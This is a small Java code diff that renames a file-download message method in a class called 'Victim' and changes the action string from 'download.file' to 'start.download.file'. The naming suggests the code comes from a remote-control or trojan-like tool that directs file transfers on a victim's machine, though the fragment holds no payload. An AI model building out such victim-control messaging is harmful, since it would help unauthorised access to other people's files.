@@ -85,9 +85,9 @@ public abstract class Victim extends Client {
         sendMessage(query);
     }
 
-    void sendDownloadFile(String path, long port, String owner) {
+    void sendStartDownloadFile(String path, long port, String owner) {
         JSONObject query = new JSONObject();
-        query.put("action", "download.file");
+        query.put("action", "start.download.file");
         query.put("path", path);
         query.put("port", port);
         query.put("owner", owner);
